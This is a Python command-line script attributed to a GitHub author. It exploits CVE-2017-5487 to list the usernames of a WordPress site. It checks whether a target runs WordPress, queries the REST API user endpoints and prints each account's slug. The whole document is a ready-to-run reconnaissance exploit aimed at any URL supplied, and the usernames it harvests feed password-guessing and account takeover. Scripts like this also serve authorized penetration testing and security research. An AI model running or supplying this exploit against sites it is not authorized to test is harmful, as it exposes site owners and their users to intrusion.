#!/bin/python3

# Author: K3ysTr0K3R
# GitHub: https://github.com/K3ysTr0K3R
# CVE-2017-5487: WordPress user enumeration.

import json
import requests
import argparse

def fetch_wordpress_users(target_url):
    wordpress_api_endpoints = [
        "/?rest_route=/wp/v2/users/",
        "/wp-json/wp/v2/users/",
    ]

    if "wp-content" in requests.get(target_url).text:
        for endpoint in wordpress_api_endpoints:
            url = f"{target_url}{endpoint}"
            response = requests.get(url)

            if response.status_code == 200:
                user_data = response.json()

                print("----------------------------")
                print("   WordPress User Listing   ")
                print("----------------------------")

                if user_data:
                    for user in user_data:
                        print("[+]", user['slug'])
                    print("----------------------------")
                    return

        print("No users found.")
    else:
        print("No WordPress installation detected.")

def main():
    parser = argparse.ArgumentParser(description='Retrieve WordPress user information via API.')
    parser.add_argument('-u', '--url', type=str, required=True, help='Target URL of the WordPress site')
    args = parser.parse_args()

    target_url = args.url
    fetch_wordpress_users(target_url)

if __name__ == "__main__":
    main()
